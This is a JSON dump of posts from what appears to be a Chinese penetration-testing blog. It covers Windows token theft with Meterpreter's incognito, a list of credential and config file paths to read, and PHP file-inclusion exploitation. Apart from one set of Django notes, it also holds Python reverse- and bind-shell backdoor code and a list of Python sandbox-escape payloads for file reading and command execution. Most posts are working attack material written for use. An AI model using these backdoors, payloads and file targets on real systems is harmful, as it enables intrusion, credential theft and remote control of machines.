[{"title":"Token窃取","url":"/2018/11/27/Token窃取/","content":"\n\n## Windows Token类型\n\nDelegation token ( 授权令牌 ) :  \n用于交互会话登录 ( 例如本地用户直接登录、远程桌面登录 )\n\nImpersonation token ( 模拟令牌 ) :\n用于非交互登录 ( 利用 net use 访问共享文件夹 )\n\n注：两种 token 只在系统重启后清除， 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效。\n\n## Token窃取工具\n\n下载链接：[incognito](https://github.com/fdiskyou/incognito2)\n\n## MSF使用incognito\n\n查看当Token： getuid\n![](/img/media/15433030952129.jpg)\n\n加载incognito：load incognito\n![](/img/media/15433031122967.jpg)\n\n列举全部token：list_tokens -u\n![](/img/media/15433033831120.jpg)\n\nToken窃取: impersonate_token \"WIN-L6B129PFE38\\aaa\"\n![](/img/media/15433034372759.jpg)\n\n返回之前token：rev2self or drop_token\n![](/img/media/15433034850524.jpg)\n![](/img/media/15433035296170.jpg)\n\n另外该工具还可以从进程中窃取token：steal_token 2144\n![](/img/media/15433036305579.jpg)\n![](/img/media/15433036919354.jpg)\n\n## 总结\n\n通过对Windows令牌窃取，可以进行用户会话升权降权的操作。可以利用其他的用户身份去进行相应的操作。\n\n","tags":["内网渗透"]},{"title":"重要文件路径","url":"/2018/11/26/重要文件路径/","content":"\n\n### windows:\n\n```\nc:/boot.ini //查看系统版本 \nc:/windows/php.ini //php配置信息 \nc:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码\nc:/winnt/php.ini c:/winnt/my.ini c:/mysql/data/mysql/user.MYD //存储了mysql.user表中的数据库连接密码 \nc:/Program Files/RhinoSoft.com/Serv-U/ServUDaemon.ini //存储了虚拟主机网站路径和密码 \nc:/Program Files/Serv-U/ServUDaemon.ini c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置 \nc:/windows/repair/sam //存储了WINDOWS系统初次安装的密码 \nc:/Program Files/ Serv-U/ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 \nc:/Program Files/RhinoSoft.com/ServUDaemon.exe \nC:/Documents and Settings/All Users/Application Data/Symantec/pcAnywhere/*.cif文件 //存储了pcAnywhere的登陆密码 \nc:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf //查看WINDOWS系统apache文件 \nc:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. \nc:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 \nd:/APACHE/Apache2/conf/httpd.conf \nC:/Program Files/mysql/my.ini\nC:\\boot.ini //查看系统版本\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 \nC:\\Windows\\repair\\sam //存储系统初次安装的密码 \nC:\\Program Files\\mysql\\my.ini //Mysql配置 \nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root \nC:\\Windows\\php.ini //php配置信息 \nC:\\Windows\\my.ini //Mysql配置信息 \n```\n\n### Linux：\n\n```\n/root/.ssh/authorized_keys\n/root/.ssh/id_rsa\n/root/.ssh/id_ras.keystore\n/root/.ssh/known_hosts //记录每个访问计算机用户的公钥\n/etc/passwd\n/etc/shadow\n/etc/my.cnf //mysql配置文件\n/etc/httpd/conf/httpd.conf //apache配置文件\n/root/.bash_history //用户历史命令记录文件\n/root/.mysql_history //mysql历史命令记录文件\n/proc/mounts //记录系统挂载设备\n/porc/config.gz //内核配置文件\n/var/lib/mlocate/mlocate.db //全文件路径\n/porc/self/cmdline //当前进程的cmdline参数\n```\n","tags":["渗透测试"]},{"title":"文件包含漏洞","url":"/2018/11/26/文件包含漏洞/","content":"\n\n\n文章首发于[t00ls](https://www.t00ls.net/thread-44223-1-1.html)，重新搭建博客后将文章存放于博客内容中。\n\n## 前言\n\n文件包含漏洞是一种常见的漏洞类型，依赖于脚本运行时的web环境，当攻击者利用可控变量构造可执行的代码路径时，该漏洞会导致攻击者利用脚本运行来执行相应的文件。如果一个网站系统存在文件包含漏洞，会导致各种基于文件的攻击。\n\n## 文件包含漏洞成因\n\n服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可去包含一个恶意文件，而我们可以构造这个恶意文件来达到攻击的目的。\n\n## 文件包含漏洞类型\n\n1、本地文件包含:  \n\n可以包含本地文件，在条件允许时甚至能执行代码\n\n2、远程文件包含:  \n\n可以包含任意文件。\n\n条件:php.ini中allow_url_fopen和allow_url_include要为On\n\nallow_url_fopen：默认的封装协议提供ftp和http协议访问远程文件\n\nallow_url_include：改选项允许使用 include,inculde_once,require,require_once \n\n(这两项可以在phpinfo信息中查看是否开启)\n        \n## 文件包含函数\n\n```\ninclude, inculde_once\nrequire, require_once\n```\n这两个函数的区别如下:\n\n为了更好的理解这里我开启了debug  (改配置文件  display_error = on)\n\ninclude():\n\n当代码执行到该函数时，找不到包含文件时会产生警告，但是脚本会继续执行。(可以看到这里包含了一个本地并不存在的文件123.php 这里虽然出现了警告,但是脚本继续往下执行输出了123。)\n![](/img/media/15432151637772.jpg)\n\nrequire():\n\n只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。(可以看到这里直接报错，后面的代码并没有被执行。\n![](/img/media/15432151806212.jpg)\n\n如果函数携带_once则表示已经包含过的代码不会被再次包含。\n\n## 本地文件包含\n\n```\n<?php \n$a = $_GET['file'];\ninclude($a);\n?>\n```\n这是一段简单的php文件包含代码，这里get获取了一个可控参数file并进行包含，这里我们可以控制它来包含我们想要的代码。\n\n这里直接将文件的内容包含，因此无论我们的文件后缀是何种形式的，如:jpg,txt等等均可以被包含并当作php代码执行。本地新建文件test.txt  内容为<?php phpinfo();?> 并对该文件包含\n![](/img/media/15432151950066.jpg)\n\n如图代码被成功包含并执行，界面显示出了phpinfo的内容。文件包含漏洞还可以包含本地服务器中的其他文件。这里因为我的环境是linux的所以可以尝试包含/etc/passwd。\n![](/img/media/15432152054790.jpg)\n\n当然这样包含还是需要一定条件的，因为这里我们是可以完全控制文件类型的，如果代码进行修改如下:\n```\n<?php \n$a = $_GET['file'].’php’;\ninclude($a);\n?>\n```\n代码中限制了文件类型，只有.php文件才被包含，这里如果按照刚才的方法进行包含的话，结果如下所示:\n![](/img/media/15432152154072.jpg)\n\n可以看出来当我们的参数传输进去时，变成了/etc/passwd.php  但是服务器中并未含有这个文件于是会报错。如果php版本小于5.3 并且magic_quotes_gpc = on  tomagic_quotes_gpc = off时我们可以使用%00截断后面的.php，但是在高版本中修复了这个问题。\n\n因为我们包含的并不只是文件而是文件的内容，因此我们可以进一步利用，这里创建一个执行命令的回显文件利用system函数执行。\n\n可以看出我们成功执行了代码。这里我们也可以编写一个shell上传然后利用菜刀链接这里就不做示范了。\n![](/img/media/15432152250063.jpg)\n\n## 远程文件包含\n\n本地文件包含与远程文件相同的原则，但前者只能包含服务器上存在的文件，后者可以包含远程服务器上的文件.\n\n之前介绍了远程包含的条件，这里还需要注意一点就是远程包含的语音不能和目标服务器语言一致，因为远程文件有php后缀和远程文件内容，远程服务器会运行代码后进行包含，包含过来的内容就不是本地服务器的了。\n\n图解如下: 本地服务器127.0.0.1  远程 192.168.40.130\n![](/img/media/15432152366926.jpg)\n![](/img/media/15432152426629.jpg)\n\n远程文件包含利用:\n![](/img/media/15432152527718.jpg)\n\n远程文件包含可以说是在以本地包含为基础，满足条件下的进一步利用。\n\n当然文件包含中还有相当多的伪协议如下:\n```\ndata:text/plain or data: text/plain; base64\nphp://input\nzip://\n```\n这里只列举了一部分还有很多大家可以自己去尝试\n\ndata:text/plain or data: text/plain; base64\n\n输出直接在对应的URL中显示参数  如果使用后者我们只需要将代码进行base64编码就行了\n![](/img/media/15432152661240.jpg)\n\nphp://input\n\n访问请求的原始数据的只读流，将post请求中的数据作为PHP代码执行。\n![](/img/media/15432152746887.jpg)\n\nZip: \n\n可以访问zip中的文件，但是需要一个绝对路径，这里的利用我们可以上传一个zip木马然后对改zip进行包含 从而获得一个shell\n首先我们本地创建一个cmd.php的文件 ,内容为：<?php system(“ipconfig”)?>  ,然后压缩为zip文件并改名为.jpg后缀 \n\n利用zip伪协议\n\n![](/img/media/15432152880097.jpg)\nPhp文件包含利用之包含临时文件\n\n利用条件:\n\n存在phpinfo页面、存在文件包含漏洞\n\n这里牵扯到一个php处理大文件流的一个知识点：默认PHP引擎对enctype=“multipart/form-data”请求处理流程：  \n\n1、 请求到达\n\n2、 创建临时文件，并写入上传文件内容\n\n3、 调用相应PHP脚本处理，比如校验文件后缀、移动文件等\n\n4、 删除临时文件\n\n当我们上传一个文件的时候他会先创建一个临时文件，我们的利用点就在这里，利用文件包含来包含上传的临时文件，但因为服务器请求速度过快，往往我们并未包含临时文件这个文件就被删除了。那么我们如何利用呢？\n\n这里牵扯到了分块传输编码：HTTP1.1支持的chunked编码传输方法，浏览器不需要等到内容字节全部下载完整，只需要接收一个chunked块即可解析页面，由于HTTP1.1采用持久连接，所以可以采用分块传输，并且只有响应包达到一定大小，无法预先判断报文大小使，才会采用chunked分块传输\n\n根据这个原理我们可以采用分块传输，提前获取临时文件名(利用phpinfo)填充大量无用请求延长脚本处理时间，并不断发送请求，这样便可以包含临时文件，在phpinfo的variables模块的_Fifles一栏中我们可以获得文件的路径，然后我们可以写脚本进行条件竞争，一边发送大量请求，一边不断包含。\n\n## 总结\n文件包含利用方式是无穷的，重点在于你的想象力，思想有多广利用程度就有多大。\n","tags":["渗透测试"]},{"title":"Django2.0 学习记录","url":"/2018/11/23/Django2-0-学习记录/","content":"\n## Django2.0学习记录\n\n### 基本使用\n```\n安装\npip install Django\n\n创建一个新的项目和应用\nDjango-admin startproject cms  // 项目\ncd cms\npython manage.py startapp we  //应用\n\n创建数据库并同步\npython manage.py makemigrations web  //创建数据库\npython manage.py migrate  //同步数据库\n\n创建超级用户\npython manage.py createsuperuser\n\n交互式shell\npython manage.py shell\n```\n\n### setting模块\n设置中文字体\n```\nLANGUAGE_CODE = 'zh_Hans'\nTIME_ZONE = 'Asia/Shanghai'\n```\n\n设置模版路径\n```\nTEMPLATES = [\n    {\n        ...\n        'DIRS': [os.path.join(BASE_DIR, 'templates')],\n        ...\n    },\n]\n```\n\n加载静态文件\n```\nSTATIC_URL = '/static/'\n\nSTATICFILES_DIRS = (\n    os.path.join(BASE_DIR, \"static\"),\n)\n```\n\n### model模块\n```\n表关系\n\n一对多，models.ForeignKey(ColorDic)\n一对一，models.OneToOneField(OneModel)\n多对多，authors = models.ManyToManyField(Author)\n\nField\nPositiveIntegerField  #正整数字段\n\n查看数据库结构\npython manage.py sqlmigrate polls 0001\n\non_delete(表关系)\n\non_delete=models.CASCADE级联删除\n当删除主表的数据时候从表中的数据也随着一起删除\n\nauto_now_add(DateTime)\n\nauto_now_add为添加时的时间，更新对象时不会有变动\n\nobjects.all()\n\nall返回的是QuerySet对象，程序并没有真的在数据库中执行SQL语句查询数据，但支持迭代，使用for循环可以获取数据\n\nobjects.get()与objects.filter()二者类似\n\nget返回的是Model对象，类型为列表，说明使用get方法会直接执行sql语句获取数据\n\n用于类型转换，将object的类型转换为可读的str型\ndef __str__(self): \n    return self.name\n\n显示中文名称\nclass Mate:\n    verbose_name = '标签'\n    verbose_name_plural = '标签'\n```\n\n### urls模块\n```\n<int:question_id>\n\npath('<int:question_id>/', views.detail, name='detail')\n<int:是一个转换器，用于确定哪些模式应与URL路径的这一部分匹配\n:question_id>定义将用于标识匹配模式的名称\n```\n\n### admin模块\n```\n显示内容更多属性\nclass PostAdmin(admin.ModelAdmin):\n    list_display = ['title', 'created_time', 'modified_time', 'category', 'author']\nadmin.site.register(Post,PostAdmin)\n```\n\n### view模块\n```\nmarkdown渲染\n\npip install markdwon\n\nimport markdown\n\ndef detail(request, pk):\n    post = get_object_or_404(Post, pk=pk)\n    post.body = markdown.markdown(post.body,\n                                  extensions=[\n                                     'markdown.extensions.extra',\n                                     'markdown.extensions.codehilite',\n                                     'markdown.extensions.toc',\n                                  ])\n    return render(request, 'blog/detail.html', context={'post': post})\n```\n","tags":["django","python"]},{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n1. windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n2. linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]},{"title":"Python 沙箱逃逸payload","url":"/2018/09/20/Python-沙箱逃逸payload/","content":"\n1. (type 'file')   读文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"/etc/passwd\").read()\n```\n2. (type 'file')   写文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"123.txt\",'w').write('asdfqwer')\n```\n\n3. (class 'warnings.catch_warnings')  命令执行\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()')\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')\n```\n4. timeit\n这个库主要是用来计时用的，用来计算函数的完成时间，后面的number=1表示函数只运行一次\n    提到timeit就由涉及到time based rce，这点跟mysq的时间延时注入很像，通过比对返回时间来获取文件内容\n    这里先来讲shell语句\n    if [ 1=1 ]; then sleep 2;fi;\n    if [ 1=2 ];then sleep 2 ;fi;\n    这里其实跟时间盲注是一个道理，，判断字符串然后返回时间，通过返回时间来进行比对，最终获取字符串\n\n```\n>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = y ];then sleep 2;fi;')\", number = 1)\n2.016458034515381\n>>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = q ];then sleep 2;fi;')\", number = 1)\n0.009487152099609375\n```\n5. platform\n这个库主要是用来识别系统什么的，这里其实最重要的是引入了popen来执行命令，因此也可用作命令执行\n\n```\nimport platform\nplatform.popen('ls').read()\n```\n6. 黑名单绕过\ndict 拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')\n```\nbase64拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['b3M='.decode('base64')].__dict__['c3lzdGVt'.decode('base64')]('ls')\n```","tags":["python"]}]